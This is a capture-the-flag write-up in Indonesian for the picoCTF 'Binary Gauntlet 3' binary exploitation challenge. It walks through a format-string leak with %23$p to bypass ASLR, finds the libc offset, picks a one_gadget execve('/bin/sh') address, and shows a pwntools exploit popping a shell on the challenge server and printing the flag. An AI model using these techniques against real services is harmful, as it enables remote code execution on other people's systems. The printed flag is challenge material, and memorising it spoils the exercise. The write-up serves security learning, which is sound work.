# Binary Gauntlet 3

```c
pwndbg> tele 18
00:0000│ rsp 0x7fffffffde30 —▸ 0x7fffffffdfd8 —▸ 0x7fffffffe29d ◂— '/home/aku/picoCTF/binary gauntlet 3/gauntlet'
01:0008│-078 0x7fffffffde38 ◂— 0x1006a0000
02:0010│-070 0x7fffffffde40 ◂— 0x800
03:0018│-068 0x7fffffffde48 ◂— 0xd40000
04:0020│-060 0x7fffffffde50 ◂— 0xd40000
05:0028│-058 0x7fffffffde58 —▸ 0x7fffffffde88 ◂— 0
06:0030│-050 0x7fffffffde60 ◂— 0x9700000006
07:0038│-048 0x7fffffffde68 ◂— 0
... ↓        7 skipped
0f:0078│-008 0x7fffffffdea8 —▸ 0x602310 ◂— 0xa70243625 /* '%6$p\n' */
10:0080│ rbp 0x7fffffffdeb0 —▸ 0x7fffffffdf50 —▸ 0x7fffffffdfb0 ◂— 0
11:0088│+008 0x7fffffffdeb8 —▸ 0x7ffff7c27635 (__libc_start_call_main+117) ◂— mov edi, eax
```

bisa di ketahui offsetnya disini adalah `18 + 5 = 23`

## Note
Kenapa disini kita mencari offset dengan menggunakan 5 sebagai parameternya? itu di ambil dari urutan register di assmebly 64-bit yang mana urutannya adalah `rdi, rsi, rdx, rcx,r8, r9 dan untuk address ke-7 dst adalah stack`, disini kita tidak perlu menghitung `rdi` karena `rdi` akan berisi format strings dari inputan awal kita yaitu `%6$p`, jadi jumlah keseluruhannya adalah 5. Ini yang kita gunakan sebagai parameter untuk menentukan offset leak yang nantinya digunakan untuk bypass `ASLR`.

```c 
pwndbg> b *main+78
Breakpoint 1 at 0x4006d5
pwndbg> r
%23$p
pwndbg> ni
0x7ffff7c27635
pwndbg> x/s 0x7ffff7c27635
0x7ffff7c27635 <__libc_start_call_main+117>:    "\211\307\350\364\226\001"
```

Setelah di cek, ternyata offsetnya benar, offset ke 23 memberikan kita leak address dari `libc_start_call_main`.

```c
❯ nm -D libc-2.27.so | grep __libc_start
0000000000021ba0 T __libc_start_main@@GLIBC_2.2.5
❯
❯
❯ nc wily-courier.picoctf.net 63442
%23$p
0x78d10d875c87```

`offset = 0xe7`

```c
one_gadget libc-2.27.so
0x4f29e execve("/bin/sh", rsp+0x40, environ)
constraints:
  address rsp+0x50 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, "-c", r12, NULL} is a valid argv

0x4f2a5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  address rsp+0x50 is writable
  rsp & 0xf == 0
  rcx == NULL || {rcx, rax, r12, NULL} is a valid argv

0x4f302 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL || {[rsp+0x40], [rsp+0x48], [rsp+0x50], [rsp+0x58], ...} is a valid argv      

0x10a2fc execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL || {[rsp+0x70], [rsp+0x78], [rsp+0x80], [rsp+0x88], ...} is a valid argv

```
dengan menggunakan `one_gadget` untuk mencari address yang nantinya bisa langsung memanggil `execve("/bin/sh")`. Disini kita akan menggunakan `0x4f302`, karena address ini constraitnya paling gampang untuk di penuhi.

```c
❯ python3 sv.py
[+] Opening connection to wily-courier.picoctf.net on port 63442: Done
/home/aku/picoCTF/binary gauntlet 3/sv.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline('%23$p')
[+] Leak Libc: 0x794a62066000
[*] Switching to interactive mode
$ ls
Dockerfile
Makefile
Solution
flag.txt
gauntlet
gauntlet.c
libc-2.27.so
start.sh
$ id
uid=999(app) gid=999(app) groups=999(app)
$ cat flag.txt
a899173977b8d11706319863888fcc13

```
